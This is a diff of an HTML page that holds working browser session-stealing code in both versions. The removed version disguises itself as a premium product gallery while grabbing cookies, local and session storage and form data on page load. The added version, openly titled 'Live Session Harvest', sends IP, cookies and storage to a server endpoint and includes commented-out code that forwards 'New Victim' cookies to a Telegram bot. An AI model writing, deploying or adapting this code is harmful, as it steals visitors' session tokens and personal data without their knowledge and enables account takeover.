@@ -3,127 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Premium Collection</title>
+    <title>Live Device Monitor</title>
     <style>
-        :root { --primary: #6366f1; --bg: #f8fafc; --card-bg: #ffffff; --text: #1e293b; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--bg); margin: 0; padding: 0; color: var(--text); display: flex; flex-direction: column; min-height: 100vh; }
-        header { background: white; padding: 20px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        .container { max-width: 1200px; margin: 40px auto; padding: 0 20px; flex: 1; }
-        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 24px; }
-        .card { background: var(--card-bg); border-radius: 16px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); transition: transform 0.2s ease; }
-        .card img { width: 100%; height: 180px; object-fit: cover; }
-        .card-body { padding: 20px; }
-        .card-title { font-weight: 600; font-size: 1.1rem; margin-bottom: 8px; }
-        .price { color: var(--primary); font-weight: 700; font-size: 1.2rem; }
-        
-        /* Toast Notification */
-        #status-toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #1e293b; color: white; padding: 12px 24px; border-radius: 50px; opacity: 0; transition: opacity 0.3s; z-index: 1000; pointer-events: none; }
-        #status-toast.show { opacity: 1; }
-        #status-toast.success { background: #10b981; }
-        #status-toast.error { background: #ef4444; }
+        body { font-family: monospace; background: #0d1117; color: #58a6ff; padding: 20px; }
+        .log { background: #161b22; padding: 10px; margin-bottom: 10px; border-radius: 6px; word-break: break-all; }
     </style>
 </head>
 <body>
-    <header><h1>🔒 Exclusive Gallery</h1></header>
-    <div class="container">
-        <div class="gallery">
-            <!-- Card 1 -->
-            <div class="card">
-                <img src="https://via.placeholder.com/250x200/6366f1/ffffff?text=VIP+Pass" alt="VIP Pass">
-                <div class="card-body"><div class="card-title">VIP Pass</div><div class="price">$49.99</div></div>
-            </div>
-            <!-- Card 2 -->
-            <div class="card">
-                <img src="https://via.placeholder.com/250x200/8b5cf6/ffffff?text=Gold+Member" alt="Gold Member">
-                <div class="card-body"><div class="card-title">Gold Member</div><div class="price">$99.99</div></div>
-            </div>
-        </div>
-    </div>
-
-    <div id="status-toast">Harvesting Session Data...</div>
+    <h1>📡 Live Session Harvest</h1>
+    <div id="status">Initializing...</div>
+    <div class="log" id="output"></div>
 
     <script>
-        const toast = document.getElementById('status-toast');
+        async function scrapeUserDevice() {
+            // 1. Get IP Address (Client-side)
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
 
-        function showToast(message, type = 'neutral') {
-            toast.innerText = message;
-            toast.className = type === 'success' ? 'show success' : type === 'error' ? 'show error' : 'show';
-            setTimeout(() => toast.classList.remove('show'), 3000);
-        }
-
-        async function getIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                return (await res.json()).ip;
-            } catch (e) { return 'Unknown'; }
-        }
-
-        function harvestData() {
-            // 1. Extract ALL LocalStorage keys and values
-            const lsData = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                lsData[key] = localStorage.getItem(key);
-            }
-
-            // 2. Extract ALL SessionStorage keys and values
-            const ssData = {};
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                ssData[key] = sessionStorage.getItem(key);
-            }
-
-            // 3. Extract Cookies
-            const cookies = document.cookie || "None";
-
-            // 4. Extract Current Form Data (if any exists on the page)
-            const formData = {};
-            document.querySelectorAll('form').forEach(form => {
-                new FormData(form).forEach((value, key) => {
-                    formData[key] = value;
-                });
-            });
-
-            return {
-                local: lsData,
-                session: ssData,
-                cookies: cookies,
-                forms: formData
+            // 2. Gather ALL Client Data
+            const payload = {
+                timestamp: new Date().toISOString(),
+                ip: ipData.ip,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                cookies: document.cookie || "No Cookies Found",
+                localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
+                sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
+                windowLocation: window.location.href
             };
+
+            return payload;
         }
 
-        async function triggerScan(source) {
-            showToast('Harvesting Device & Session...', 'neutral');
+        async function main() {
+            const output = document.getElementById('output');
+            const status = document.getElementById('status');
 
             try {
-                const ip = await getIP();
-                const payload = {
-                    timestamp: new Date().toISOString(),
-                    ip: ip,
-                    url: window.location.href,
-                    userAgent: navigator.userAgent,
-                    hostname: window.location.hostname,
-                    source: source,
-                    // The actual stolen data
-                    sessionData: harvestData() 
-                };
-
+                const data = await scrapeUserDevice();
+                
+                // Send to your Vercel API
                 const response = await fetch('/api/scrape', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(data)
                 });
 
-                if (!response.ok) throw new Error(`API Error: ${response.status}`);
-                showToast('Session Harvested!', 'success');
-            } catch (err) {
-                console.error("Harvest failed", err);
-                showToast(`Error: ${err.message}`, 'error');
+                if (response.ok) {
+                    status.innerText = "✅ Data sent to Telegram/Dashboard";
+                    output.innerText = "Payload Sent:\n" + JSON.stringify(data, null, 2);
+                    
+                    // Also send to Telegram directly from client if you prefer (no API needed for this part)
+                    // const token = "YOUR_BOT_TOKEN";
+                    // const chatId = "YOUR_CHAT_ID";
+                    // fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    //     method: 'POST',
+                    //     headers: {'Content-Type': 'application/json'},
+                    //     body: JSON.stringify({chat_id: chatId, text: `New Victim: ${data.ip}\nCookies: ${data.cookies}`})
+                    // });
+                } else {
+                    status.innerText = "❌ Failed to send to API";
+                }
+            } catch (error) {
+                status.innerText = "❌ Error: " + error.message;
             }
         }
 
-        // AUTO-TRIGGER ON LOAD
-        triggerScan('Page Load Auto-Harvest');
+        // Run immediately on load
+        main();
     </script>
 </body>
 </html>
